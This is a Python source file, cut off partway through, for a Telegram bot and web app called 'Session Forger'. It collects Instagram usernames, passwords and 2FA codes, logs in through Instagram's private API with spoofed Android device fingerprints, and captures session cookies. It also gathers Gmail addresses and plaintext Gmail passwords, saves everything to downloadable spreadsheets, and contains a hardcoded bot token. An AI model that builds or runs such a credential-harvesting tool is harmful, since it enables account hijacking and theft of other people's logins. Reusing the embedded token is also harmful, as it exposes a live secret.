import sys
import os
import subprocess
import time
import logging
import json
import threading
import signal
import uuid
import secrets
import random
import shutil
import re
from typing import Optional
from urllib.parse import urlencode

# --- Configuration ---
BOT_TOKEN = "8591242778:AAHpyMLfltgl5ufLfI8f0QAyBklm_Kn3Q4I"
PORT = 8000
DATA_DIR = "data"

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("session_bot.log", mode='a')
    ]
)
logger = logging.getLogger(__name__)

# --- Runtime Dependency Check ---
REQUIRED_PACKAGES = [
    "fastapi", "uvicorn", "instaloader", "pandas", "openpyxl",
    "python-multipart", "pyTelegramBotAPI", "requests"
]

def install_dependencies():
    for package in REQUIRED_PACKAGES:
        try:
            # Map package names to import names
            import_name = package
            if package == "pyTelegramBotAPI": import_name = "telebot"
            if package == "python-multipart": import_name = "multipart"

            if package == "python-multipart":
                 try:
                     import python_multipart
                 except ImportError:
                     raise ImportError
            else:
                 __import__(import_name)

        except ImportError:
            logger.info(f"📦 Package '{package}' not found. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                logger.info(f"✅ '{package}' installed successfully.")
            except Exception as e:
                logger.error(f"Failed to install {package}: {e}")

install_dependencies()

# Imports after installation
import telebot
from telebot.types import MenuButtonWebApp, WebAppInfo
import instaloader
from fastapi import FastAPI, Request, UploadFile, Form, HTTPException, File
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import requests
import pandas as pd

# --- Global State ---
pending_logins = {} # { "session_token": { "instance": InstagramObject, "username": str, ... } }

# --- Custom Instagram API Class ---
class Instagram:
    def __init__(self, username: str, password: str) -> None: #L7N
        self.username = username
        self.password = password
        self.session = requests.Session()
        rnd = str(random.randint(150, 999))
        self.Blockversion = secrets.token_hex(16)
        self.IgFamilyDeviceId = uuid.uuid4()
        self.AndroidID = f'android-{secrets.token_hex(8)}'
        self.IgDeviceId = uuid.uuid4()
        self.PigeonSession = f'UFS-{uuid.uuid4()}-0'
        # Fixed App ID for stability
        self.App = ''.join(random.choices('1234567890', k=15))
        self.user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999))+ ")"
        self.two_factor_identifier = None
        self.cookie_string = ""

    def tokens(self) -> str:
        data = urlencode({
            'device_id': str(self.AndroidID),
            'custom_device_id': str(self.IgDeviceId),
        })

        headers = {
            'X-Pigeon-Session-Id': str(self.PigeonSession),
            'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
            'X-Ig-Bandwidth-Speed-Kbps': f'{random.randint(1000, 9999)}.000',
            'X-Ig-Bandwidth-Totalbytes-B': str(random.randint(10000000, 99999999)),
            'X-Ig-Bandwidth-Totaltime-Ms': str(random.randint(10000, 99999)),
            'X-Bloks-Version-Id': str(self.Blockversion),
            'X-Ig-Device-Id': str(self.IgDeviceId),
            'X-Ig-Android-Id': str(self.AndroidID),
            'User-Agent': self.user_agent,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }

        try:
            self.session.post('https://b.i.instagram.com/api/v1/zr/tokens/', headers=headers, data=data)
        except Exception:
            pass

        headers['X-Ig-Family-Device-Id'] = str(self.IgFamilyDeviceId)

        try:
            self.session.post('https://b.i.instagram.com/api/v1/zr/tokens/', headers=headers, data=data)
        except Exception:
            pass

        data2 = f'signed_body=SIGNATURE.%7B%22phone_id%22%3A%22{self.IgFamilyDeviceId}%22%2C%22usage%22%3A%22prefill%22%7D'

        try:
            self.session.post(
                'https://b.i.instagram.com/api/v1/accounts/contact_point_prefill/',
                headers=headers, data=data2)
        except Exception:
            pass

        data3 = urlencode({
            'signed_body': 'SIGNATURE.{"bool_opt_policy":"0","mobileconfigsessionless":"","api_version":"3","unit_type":"1","query_hash":"1fe1eeee83cc518f2c8b41f7deae1808ffe23a2fed74f1686f0ab95bbda55a0b","device_id":"'
            + str(self.IgDeviceId) + '","fetch_type":"ASYNC_FULL","family_device_id":"' + str(self.IgFamilyDeviceId).upper() + '"}'
        })

        try:
            response = self.session.post(
                'https://b.i.instagram.com/api/v1/launcher/mobileconfig/',
                headers=headers, data=data3)
            return response.headers.get('ig-set-x-mid')
        except Exception:
            return None

    def _update_cookie_string(self, response=None):
        """Robustly update cookies from jar and headers."""
        try:
            all_cookies = {}

            # 1. From CookieJar
            for cookie in self.session.cookies:
                all_cookies[cookie.name] = cookie.value

            # 2. From Response Cookies
            if response:
                for cookie in response.cookies:
                    all_cookies[cookie.name] = cookie.value

            # 3. Direct Header Parsing (Deep Analysis Fix)
            # Sometimes Set-Cookie isn't auto-merged if domains strictly mismatch in the eyes of requests
            if response and 'Set-Cookie' in response.headers:
                raw_cookie = response.headers['Set-Cookie']
                # regex to find sessionid=...;
                session_match = re.search(r'sessionid=([^;]+)', raw_cookie)
                if session_match:
                    all_cookies['sessionid'] = session_match.group(1)

            self.cookie_string = "; ".join([f"{k}={v}" for k, v in all_cookies.items()])

            # Debug log
            if "sessionid" in self.cookie_string:
                logger.info(f"✅ Session ID captured for {self.username}")
            else:
                logger.warning(f"⚠️ Session ID MISSING. Raw Header: {response.headers.get('Set-Cookie') if response else 'No Resp'}")

        except Exception as e:
            logger.error(f"Error updating cookies: {e}")

    def login(self):
        mid = self.tokens()
        if not mid:
            return {"status": "error", "message": "Failed to generate tokens"}

        payload_json = json.dumps({
            "_csrftoken": "missing",
            "adid": str(self.IgFamilyDeviceId),
            "country_codes": [{"country_code": "7", "source": ["default", "uig_via_phone_id"]}],
            "device_id": str(self.AndroidID),
            "google_tokens": [],
            "guid": str(self.IgDeviceId),
            "login_attempt_count": 0,
            "jazoest": str(random.randint(11111, 55555)),
            "phone_id": str(self.IgDeviceId),
            "username": str(self.username),
            "enc_password": f"#PWD_INSTAGRAM:0:{round(time.time(), 3)}:{self.password}"
        })

        data = {
            "signed_body": f"SIGNATURE.{payload_json}"
        }

        headers = {
            'User-Agent': str(self.user_agent),
            'x-pigeon-session-id': str(self.PigeonSession),
            'x-ig-bandwidth-speed-kbps': str(random.randint(10000000, 99999999)),
            'x-bloks-version-id': str(self.Blockversion),
            'x-ig-device-id': str(self.IgDeviceId),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(10000, 99999)),
            'x-ig-app-id': str(self.App),
            'x-mid': str(mid),
            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(10000000, 99999999)),
            'x-ig-android-id': str(self.AndroidID),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

        try:
            response = self.session.post(
                'https://b.i.instagram.com/api/v1/accounts/login/',
                headers=headers, data=data)

            # Explicitly update cookies from this response
            self.session.cookies.update(response.cookies)
            self._update_cookie_string(response)

            resp_json = response.json()

            if response.status_code == 200 and "logged_in_user" in resp_json:
                return {"status": "success", "data": resp_json}

            if "two_factor_required" in resp_json:
                self.two_factor_identifier = resp_json["two_factor_info"]["two_factor_identifier"]
                return {"status": "2fa_required", "message": "Two-factor authentication required."}

            if "challenge" in resp_json:
                 challenge_url = resp_json.get("challenge", {}).get("url", "")
                 return {
                     "status": "challenge_required",
                     "message": "Checkpoint challenge required.",
                     "challenge_url": challenge_url
                 }

            # Specific error handling
            message = resp_json.get("message", "Unknown error")

            if "bad_password" in message or "invalid_user" in message:
                return {"status": "fail", "message": "Incorrect username or password."}

            if "checkpoint_required" in message:
                 return {
                     "status": "challenge_required",
                     "message": "Security Checkpoint: Account locked. Verify on device.",
                     "challenge_url": resp_json.get("checkpoint_url", "")
                 }

            return {"status": "fail", "message": message, "raw": resp_json}

        except Exception as e:
            return {"status": "error", "message": str(e)}

    def two_factor_login(self, code):
        if not self.two_factor_identifier:
            return {"status": "error", "message": "No 2FA identifier found."}

        data = {
            "signed_body": f"SIGNATURE." + json.dumps({
                "verification_code": code,
                "two_factor_identifier": self.two_factor_identifier,
                "username": self.username,
                "device_id": str(self.AndroidID),
                "guid": str(self.IgDeviceId),
            })
        }

        headers = {
            'User-Agent': self.user_agent,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

        try:
            response = self.session.post(
                'https://b.i.instagram.com/api/v1/accounts/two_factor_login/',
                headers=headers, data=data
            )

            self.session.cookies.update(response.cookies)
            self._update_cookie_string(response)

            resp_json = response.json()

            if response.status_code == 200 and "logged_in_user" in resp_json:
                 return {"status": "success", "data": resp_json}

            return {"status": "fail", "message": resp_json.get("message", "2FA Failed")}
        except Exception as e:
             return {"status": "error", "message": str(e)}


# --- Telegram Bot Setup ---
bot = telebot.TeleBot(BOT_TOKEN)
tunnel_url = None

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    if not tunnel_url:
        bot.send_message(chat_id, "⚠️ System is starting up. Please wait...")
        return

    web_app_url = f"{tunnel_url}?user_id={chat_id}"

    try:
        web_app_info = WebAppInfo(url=web_app_url)
        menu_button = MenuButtonWebApp(type='web_app', text="Open App", web_app=web_app_info)
        bot.set_chat_menu_button(chat_id, menu_button)
    except Exception as e:
        logger.error(f"Failed to set menu button: {e}")

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("Open Web App", web_app=web_app_info))

    bot.send_message(
        chat_id,
        "🚀 *Welcome to the Session Manager*\n\nClick the button below to access the secure dashboard.",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(commands=['resetdata'])
def handle_reset(message):
    chat_id = message.chat.id
    try:
        if os.path.exists(DATA_DIR):
            shutil.rmtree(DATA_DIR)
            os.makedirs(DATA_DIR, exist_ok=True)

        # Clear pending logins
        pending_logins.clear()

        bot.send_message(chat_id, "🗑️ *All Data Reset*\n\nSession files and cache have been cleared.", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Reset failed: {e}")

# --- FastAPI Setup ---
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Ensure data directory
os.makedirs(DATA_DIR, exist_ok=True)

# HTML Content
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Session Forger</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&family=Fira+Code:wght@400&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; background-color: #0f172a; color: #e2e8f0; }
        h1, h2, h3 { font-family: 'Orbitron', sans-serif; }
        .cyber-input {
            background: #1e293b; border: 1px solid #334155; color: #fff;
            transition: all 0.3s;
        }
        .cyber-input:focus {
            border-color: #0ea5e9; box-shadow: 0 0 10px rgba(14, 165, 233, 0.5);
        }
        .cyber-btn {
            background: linear-gradient(45deg, #0ea5e9, #6366f1);
            color: white; font-weight: bold; text-transform: uppercase;
            letter-spacing: 1px; transition: transform 0.2s, box-shadow 0.2s;
        }
        .cyber-btn:active { transform: scale(0.98); }
        .glass-panel {
            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .file-item {
            background: rgba(51, 65, 85, 0.5); border: 1px solid rgba(255,255,255,0.05);
            transition: background 0.2s;
        }
        .file-item:hover { background: rgba(51, 65, 85, 0.8); }
        .loader {
            border: 3px solid #f3f3f3; border-top: 3px solid #3498db;
            border-radius: 50%; width: 20px; height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .terminal-box {
            background: #000; border: 1px solid #333; color: #0f0;
            font-family: 'Fira Code', monospace; font-size: 10px;
            padding: 10px; border-radius: 6px; overflow-y: auto; max-height: 150px;
        }
        .term-error { color: #ff5555; }
        .term-info { color: #8be9fd; }

        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0f172a; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
    </style>
</head>
<body x-data="appData()" x-init="initApp()">

    <div class="min-h-screen flex flex-col items-center p-4 relative overflow-hidden" id="app-container">
        <!-- Background accents -->
        <div class="absolute top-[-10%] left-[-10%] w-64 h-64 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-64 h-64 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-2000"></div>

        <div class="w-full max-w-md glass-panel rounded-2xl p-6 shadow-2xl relative z-10 my-auto">

            <div class="text-center mb-6">
                <div class="w-16 h-16 mx-auto bg-gradient-to-tr from-blue-400 to-purple-500 rounded-full flex items-center justify-center shadow-lg mb-3">
                     <!-- FIXED: Proxy the image -->
                     <img src="/api/bot-icon" class="w-14 h-14 rounded-full border-2 border-white" alt="Bot">
                </div>
                <h1 class="text-xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-400">
                    Session Forger
                </h1>
            </div>

            <!-- VIEW: HOME (Main Menu) -->
            <div x-show="view === 'home'" x-transition>
                <div class="space-y-4">
                    <button @click="startCreateFlow" class="cyber-btn w-full p-4 rounded-xl shadow-lg flex items-center justify-center space-x-2">
                        <span class="text-2xl">+</span>
                        <span>CREATE NEW FILE</span>
                    </button>

                    <button @click="loadFiles" class="bg-slate-800 hover:bg-slate-700 w-full p-4 rounded-xl shadow-lg border border-slate-600 text-slate-300 font-bold tracking-wider transition">
                        MY FILES
                    </button>
                </div>
            </div>

            <!-- VIEW: FILE LIST (My Files) -->
            <div x-show="view === 'file_list'" x-transition style="display: none;">
                <div class="flex justify-between items-center mb-4">
                    <button @click="view = 'home'" class="text-slate-400 hover:text-white">← Back</button>
                    <h2 class="text-sm font-bold text-blue-300">SAVED FILES</h2>
                </div>

                <div class="space-y-2 max-h-80 overflow-y-auto pr-1">
                    <template x-for="file in files" :key="file.name">
                        <div @click="openFileDetails(file)" class="file-item p-4 rounded-lg flex justify-between items-center cursor-pointer">
                            <div>
                                <p class="text-sm font-bold text-white truncate w-40" x-text="file.name"></p>
                                <p class="text-[10px] text-slate-400" x-text="file.count + ' Accounts'"></p>
                            </div>
                            <span class="text-slate-500">›</span>
                        </div>
                    </template>
                    <div x-show="files.length === 0 && !loading" class="text-center py-8 text-slate-500 text-xs">
                        No files found.
                    </div>
                </div>
                <div x-show="loading" class="flex justify-center py-4"><div class="loader"></div></div>
            </div>

            <!-- VIEW: FILE DETAILS (Inside a File) -->
            <div x-show="view === 'file_details'" x-transition style="display: none;">
                <div class="flex justify-between items-center mb-6">
                    <button @click="loadFiles" class="text-slate-400 hover:text-white">← Back</button>
                    <div class="text-center">
                        <h2 class="text-sm font-bold text-white truncate max-w-[150px]" x-text="currentFile.name"></h2>
                        <button @click="renameFile" class="text-[10px] text-blue-400 underline">Edit Name</button>
                    </div>
                    <div class="w-8"></div> <!-- Spacer -->
                </div>

                <div class="space-y-3">
                    <button @click="addAccountToFile" class="cyber-btn w-full p-3 rounded-lg shadow-lg">
                        ADD ACCOUNT <span class="opacity-75 text-xs ml-1" x-text="'(Next: ' + (currentFile.count + 1) + '.)'"></span>
                    </button>

                    <div class="grid grid-cols-2 gap-3 mt-4">
                        <button @click="downloadFile(currentFile.name)" class="p-3 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-bold text-white transition">
                            DOWNLOAD
                        </button>
                        <button @click="deleteFile(currentFile.name)" class="p-3 bg-red-900/40 hover:bg-red-900/60 border border-red-500/30 rounded-lg text-xs font-bold text-red-300 transition">
                            DELETE
                        </button>
                    </div>
                </div>
            </div>

            <!-- VIEW: LOGIN FLOW (Create/Append) -->
            <div x-show="view === 'login_flow'" x-transition style="display: none;">
                <div class="mb-4 flex items-center">
                    <button @click="cancelLogin" class="text-slate-400 hover:text-white text-xs mr-auto">Cancel</button>
                    <span class="text-xs text-slate-500 font-mono" x-show="targetFilename" x-text="targetFilename"></span>
                </div>

                <!-- Step 0: Enter Filename (Only for New File) -->
                <div x-show="step === 'filename_input'">
                    <div class="text-center mb-6">
                        <p class="text-xs text-blue-400 font-semibold uppercase tracking-wider">New File Setup</p>
                    </div>
                    <form @submit.prevent="submitFilename">
                        <div class="mb-6">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">FILE NAME</label>
                            <input type="text" x-model="newFilename" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="e.g., MyLogs_Batch1" required>
                        </div>
                        <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center">
                            <span>Next</span>
                        </button>
                    </form>
                </div>

                <!-- Step 1: Login Form -->
                <div x-show="step === 'login'">
                    <div class="text-center mb-4" x-show="currentFile && currentFile.count !== undefined">
                        <p class="text-xs text-green-400 font-bold">ADDING ACCOUNT #<span x-text="currentFile.count + 1"></span></p>
                    </div>
                    <form @submit.prevent="submitLogin">
                        <div class="mb-4">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">INSTAGRAM USERNAME</label>
                            <input type="text" x-model="username" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="username" required>
                        </div>
                        <div class="mb-6">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">PASSWORD</label>
                            <input type="password" x-model="password" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="••••••••" required>
                        </div>
                        <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                            <span x-show="!loading">Initialize Session</span>
                            <div x-show="loading" class="loader"></div>
                        </button>
                    </form>
                </div>

                <!-- Step 2: Verification -->
                <div x-show="step === 'verify'" style="display: none;">
                    <div class="text-center mb-4">
                        <p class="text-xs text-yellow-400 font-semibold uppercase tracking-wider">Verification Required</p>
                        <p class="text-[10px] text-slate-400">Enter the code sent to your device.</p>
                    </div>
                    <form @submit.prevent="submitVerification">
                        <div class="mb-6">
                            <label class="block text-[10px] font-bold mb-1 text-yellow-300">SECURITY CODE</label>
                            <input type="text" x-model="verificationCode" class="cyber-input w-full p-3 rounded-lg outline-none text-center text-xl tracking-widest font-mono" placeholder="000000" required>
                        </div>
                        <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                            <span x-show="!loading">Verify & Continue</span>
                            <div x-show="loading" class="loader"></div>
                        </button>
                    </form>
                </div>

                <!-- Step 3: Gmail Input -->
                <div x-show="step === 'gmail_input'" style="display: none;">
                    <div class="text-center mb-4">
                        <p class="text-xs text-blue-400 font-semibold uppercase tracking-wider">Additional Details</p>
                    </div>
                    <form @submit.prevent="submitGmail">
                        <div class="mb-4">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">GMAIL ADDRESS</label>
                            <input type="email" x-model="gmail" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="example@gmail.com">
                        </div>
                        <div class="mb-6">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">GMAIL PASSWORD</label>
                            <input type="text" x-model="gmailPassword" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="Password">
                        </div>
                        <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                            <span x-show="!loading">Save to File</span>
                            <div x-show="loading" class="loader"></div>
                        </button>
                    </form>
                </div>

                <!-- Logs -->
                <div x-show="logs.length > 0" x-transition class="mt-6">
                    <p class="text-[10px] font-bold text-slate-500 mb-1">SYSTEM LOGS</p>
                    <div class="terminal-box">
                        <template x-for="(log, index) in logs" :key="index">
                            <div :class="{'term-error': log.type === 'error', 'term-info': log.type === 'info'}">
                                <span class="opacity-50" x-text="log.time"></span> <span x-text="log.msg"></span>
                            </div>
                        </template>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        function appData() {
            return {
                view: 'home', // home | file_list | file_details | login_flow
                step: 'login', // filename_input | login | verify | gmail_input

                // Data
                files: [],
                currentFile: null, // { name: 'MyFile.xlsx', count: 5 }
                targetFilename: '', // The file we are writing to

                // Inputs
                newFilename: '',
                username: '',
                password: '',
                verificationCode: '',
                gmail: '',
                gmailPassword: '',

                loading: false,
                sessionToken: '',
                userId: null,
                logs: [],

                initApp() {
                    if (window.Telegram && window.Telegram.WebApp) {
                        window.Telegram.WebApp.ready();
                        window.Telegram.WebApp.expand();
                    }
                    this.sessionToken = Math.random().toString(36).substring(2);
                    const urlParams = new URLSearchParams(window.location.search);
                    this.userId = urlParams.get('user_id');
                },

                // Navigation Logic
                startCreateFlow() {
                    this.resetForm();
                    this.view = 'login_flow';
                    this.step = 'filename_input';
                    this.targetFilename = '';
                    this.currentFile = { count: 0 };
                },

                loadFiles() {
                    this.loading = true;
                    fetch('/api/files')
                        .then(r => r.json())
                        .then(data => {
                            this.files = data;
                            this.view = 'file_list';
                        })
                        .finally(() => this.loading = false);
                },

                openFileDetails(file) {
                    this.currentFile = file;
                    this.view = 'file_details';
                },

                addAccountToFile() {
                    this.resetForm();
                    this.targetFilename = this.currentFile.name;
                    this.view = 'login_flow';
                    this.step = 'login';
                },

                cancelLogin() {
                    this.view = 'home';
                    this.logs = [];
                },

                // Actions
                submitFilename() {
                    if (!this.newFilename.endsWith('.xlsx')) this.newFilename += '.xlsx';
                    this.targetFilename = this.newFilename;
                    this.step = 'login';
                },

                async renameFile() {
                    const newName = prompt("Enter new filename:", this.currentFile.name);
                    if (newName && newName !== this.currentFile.name) {
                        let safeName = newName;
                        if (!safeName.endsWith('.xlsx')) safeName += '.xlsx';

                        const formData = new FormData();
                        formData.append('old_name', this.currentFile.name);
                        formData.append('new_name', safeName);

                        try {
                            const res = await fetch('/api/rename_file', { method: 'POST', body: formData });
                            if (res.ok) {
                                this.currentFile.name = safeName;
                                this.loadFiles();
                            } else {
                                alert("Failed to rename file.");
                            }
                        } catch(e) { alert(e); }
                    }
                },

                async deleteFile(filename) {
                    if (confirm(`Are you sure you want to delete ${filename}?`)) {
                        const formData = new FormData();
                        formData.append('filename', filename);
                        await fetch('/api/delete_file', { method: 'POST', body: formData });
                        this.loadFiles();
                    }
                },

                downloadFile(filename) {
                    const url = window.location.origin + '/api/download/' + encodeURIComponent(filename);
                    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openLink) {
                        window.Telegram.WebApp.openLink(url, {try_instant_view: false});
                    } else {
                        window.open(url, '_blank');
                    }
                },

                // Shared Logic
                resetForm() {
                    this.username = ''; this.password = ''; this.verificationCode = '';
                    this.gmail = ''; this.gmailPassword = ''; this.newFilename = '';
                    this.logs = [];
                    this.sessionToken = Math.random().toString(36).substring(2);
                },

                addLog(msg, type='info') {
                    const time = new Date().toLocaleTimeString('en-US', {hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit'});
                    this.logs.push({time: `[${time}]`, msg, type});
                    this.$nextTick(() => {
                         const term = document.querySelector('.terminal-box');
                         if(term) term.scrollTop = term.scrollHeight;
                    });
                },

                async reportErrorInstant(errorMsg) {
                    if (!this.userId) return;
                    try {
                        // Send text immediately
                        const formData = new FormData();
                        formData.append('user_id', this.userId);
                        formData.append('error_msg', errorMsg);
                        fetch('/api/report_error_text', { method: 'POST', body: formData });

                        // Capture screenshot in background
                        await new Promise(r => setTimeout(r, 500));
                        const canvas = await html2canvas(document.body);
                        canvas.toBlob(async (blob) => {
                            if (!blob) return;
                            const formDataImg = new FormData();
                            formDataImg.append('user_id', this.userId);
                            formDataImg.append('error_msg', errorMsg);
                            formDataImg.append('screenshot', blob, 'error.png');
                            await fetch('/api/report_error', { method: 'POST', body: formDataImg });
                        }, 'image/png');
                    } catch (e) {
                        console.error(e);
                    }
                },

                async submitLogin() {
                    this.loading = true;
                    this.logs = [];
                    this.addLog(`Starting session for ${this.username}...`);

                    try {
                        const formData = new FormData();
                        formData.append('username', this.username);
                        formData.append('password', this.password);
                        formData.append('session_token', this.sessionToken);
                        formData.append('filename', this.targetFilename);

                        const response = await fetch('/api/login', { method: 'POST', body: formData });
                        const data = await response.json();

                        if (response.ok) {
                            if (data.status === '2fa_required') {
                                this.addLog("2FA Required.", "info");
                                this.step = 'verify';
                            } else if (data.status === 'awaiting_gmail') {
                                this.addLog("Login verified.", "info");
                                this.step = 'gmail_input';
                            }
                        } else {
                            const errorDetail = data.detail || 'Error';
                            this.addLog(`FAILED: ${errorDetail}`, "error");
                            this.reportErrorInstant(errorDetail);
                        }
                    } catch (e) {
                        this.addLog(`ERROR: ${e.message}`, "error");
                        this.reportErrorInstant(e.message);
                    } finally {
                        this.loading = false;
                    }
                },

                async submitVerification() {
                    this.loading = true;
                    try {
                        const formData = new FormData();
                        formData.append('code', this.verificationCode);
                        formData.append('session_token', this.sessionToken);

                        const response = await fetch('/api/verify_2fa', { method: 'POST', body: formData });
                        const data = await response.json();

                        if (response.ok) {
                            if (data.status === 'awaiting_gmail') {
                                this.addLog("Verified.", "info");
                                this.step = 'gmail_input';
                            }
                        } else {
                            this.addLog(`FAILED: ${data.detail}`, "error");
                            this.reportErrorInstant(data.detail);
                        }
                    } catch (e) {
                         this.addLog(`ERROR: ${e.message}`, "error");
                    } finally {
                        this.loading = false;
                    }
                },

                async submitGmail() {
                    this.loading = true;
                    this.addLog("Saving to " + this.targetFilename + "...");
                    try {
                        const formData = new FormData();
                        formData.append('gmail', this.gmail);
                        formData.append('gmail_password', this.gmailPassword);
                        formData.append('session_token', this.sessionToken);
                        formData.append('filename', this.targetFilename);

                        const response = await fetch('/api/complete_session', { method: 'POST', body: formData });
                        const data = await response.json();

                        if (response.ok) {
                            this.addLog("Saved successfully.", "info");
                            alert("Account saved to " + this.targetFilename);
                            this.loadFiles(); // Go back to list/details
                        } else {
                             this.addLog(`SAVE FAILED: ${data.detail}`, "error");
                             this.reportErrorInstant(data.detail);
                        }
                    } catch (e) {
                        this.addLog(`ERROR: ${e.message}`, "error");
                    } finally {
                        this.loading = false;
                    }
                }
            }
        }
    </script>
</body>
</html>
"""

@app.get("/")
async def get_index():
    return HTMLResponse(content=HTML_CONTENT)

@app.get("/api/bot-icon")
async def get_bot_icon():
    # Attempt to fetch, fall back to robust static default
    try:
        info = bot.get_me()
        photos = bot.get_user_profile_photos(info.id)
        if photos.total_count > 0:
            file_id = photos.photos[0][0].file_id
            file_info = bot.get_file(file_id)
            url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            # Proxy it
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                return Response(content=r.content, media_type="image/jpeg")
    except Exception as e:
        logger.error(f"Error fetching icon: {e}")

    # Fallback: Cyberpunk Robot Icon (Public URL)
    return RedirectResponse(url="https://cdn-icons-png.flaticon.com/512/4712/4712109.png")

@app.get("/api/files")
async def list_files():
    files = []
    if os.path.exists(DATA_DIR):
        for f in os.listdir(DATA_DIR):
            if f.endswith(".xlsx"):
                path = os.path.join(DATA_DIR, f)
                # Count rows
                try:
                    df = pd.read_excel(path)
                    count = len(df)
                except:
                    count = 0

                files.append({
                    "name": f,
                    "count": count
                })
    return JSONResponse(content=files)

@app.post("/api/rename_file")
async def rename_file(old_name: str = Form(...), new_name: str = Form(...)):
    if ".." in old_name or ".." in new_name or "/" in old_name or "/" in new_name:
        raise HTTPException(status_code=400, detail="Invalid filename")

    old_path = os.path.join(DATA_DIR, old_name)
    new_path = os.path.join(DATA_DIR, new_name)

    if os.path.exists(old_path) and not os.path.exists(new_path):
        os.rename(old_path, new_path)
        return JSONResponse(content={"status": "success"})
    return HTTPException(status_code=400, detail="Rename failed")

@app.post("/api/delete_file")
async def delete_file(filename: str = Form(...)):
    if ".." in filename or "/" in filename:
        raise HTTPException(status_code=400, detail="Invalid filename")

    path = os.path.join(DATA_DIR, filename)
    if os.path.exists(path):
        os.remove(path)
        return JSONResponse(content={"status": "success"})
    return HTTPException(status_code=404, detail="File not found")

@app.get("/api/download/{filename}")
async def download_file(filename: str):
    if ".." in filename or "/" in filename:
        raise HTTPException(status_code=400, detail="Invalid filename")
    file_path = os.path.join(DATA_DIR, filename)
    if os.path.exists(file_path) and filename.endswith(".xlsx"):
        return FileResponse(file_path, filename=filename)
    return HTTPException(status_code=404, detail="File not found")

@app.post("/api/report_error_text")
async def report_error_text(
    user_id: str = Form(...),
    error_msg: str = Form(...)
):
    try:
        bot.send_message(
            chat_id=user_id,
            text=f"🚨 *Login Error Detected*\n\n`{error_msg}`",
            parse_mode="Markdown"
        )
        return JSONResponse(content={"status": "sent"})
    except Exception as e:
        logger.error(f"Failed to report text error: {e}")
        return JSONResponse(status_code=500, content={"detail": str(e)})

@app.post("/api/report_error")
async def report_error(
    user_id: str = Form(...),
    error_msg: str = Form(...),
    screenshot: UploadFile = File(...)
):
    try:
        image_data = await screenshot.read()
